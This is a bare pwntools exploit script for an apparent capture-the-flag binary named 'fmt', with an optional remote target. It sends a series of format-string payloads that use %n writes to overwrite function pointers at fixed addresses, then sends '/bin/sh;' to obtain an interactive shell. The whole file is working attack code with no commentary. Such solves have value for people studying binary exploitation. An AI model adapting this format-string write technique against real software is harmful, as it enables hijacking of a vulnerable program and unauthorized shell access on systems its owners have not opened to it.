from pwn import *

EXE = './fmt'
HOST = 'pwn.byteband.it'
PORT = 6969

#context.log_level = 'debug'

if args.REMOTE:
    r = remote(HOST, PORT)
else :
    r = process(EXE)

#gdb.attach(r, 'b* main+222')

r.sendlineafter("Choice: ", '2')
payload = '%{}c%cc'.format(0x040128F - 2)
payload += '%8$n'
payload += p64(0x404028)
r.sendlineafter("a gift.\n", payload)

payload = '%8$n%ccc'
payload += p64(0x40405c)
r.sendlineafter("a gift.\n", payload)

payload = '%{}c%c'.format(0x401056 - 1)
payload += '%10$n'
payload += p64(0x404058)
r.sendlineafter("a gift.\n", payload)

payload = '%{}c%c'.format(0x004011A7 - 1)
payload += '%11$n'
payload += p64(0x404028)
r.sendlineafter("a gift.\n", payload)

r.sendline('/bin/sh;')

r.interactive()

